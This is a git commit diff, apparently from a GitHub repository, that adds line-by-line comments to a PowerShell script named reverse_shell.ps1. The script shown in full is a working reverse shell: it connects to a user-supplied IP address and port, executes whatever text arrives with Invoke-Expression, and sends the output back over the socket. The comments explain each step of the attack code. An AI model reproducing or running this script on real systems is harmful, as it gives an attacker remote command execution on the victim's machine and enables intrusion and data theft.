aeab61465fa06459b579ddedce25d889b143bb41
Georges <99199584+Georges12345@users.noreply.github.com>
2023-04-30 06:41:06 -0400

    Update reverse_shell.ps1

--- reverse_shell.ps1
+++ reverse_shell.ps1
@@ -1,9 +1,16 @@
 $ip = Read-Host "Enter IP address"
 $port = Read-Host "Enter port number"
 
+#creating a new TCP client object.
 $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
-$stream = $client.GetStream()
+
+#getting the network stream associated with the TCP client object.
+$stream = $client.GetStream() 
+
+#creating a byte array to store the data received from the remote host.
 [byte[]]$bytes = 0..65535|%{0}
+
+#reading data from the network stream and executes it as PowerShell commands, then sending the output back to the remote host.
 while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
     $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
     $sendback = (iex $data 2>&1 | Out-String )
@@ -12,4 +19,6 @@ while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
     $stream.Write($sendbyte,0,$sendbyte.Length)
     $stream.Flush()
 }
+
+#closing the TCP client object
 $client.Close()
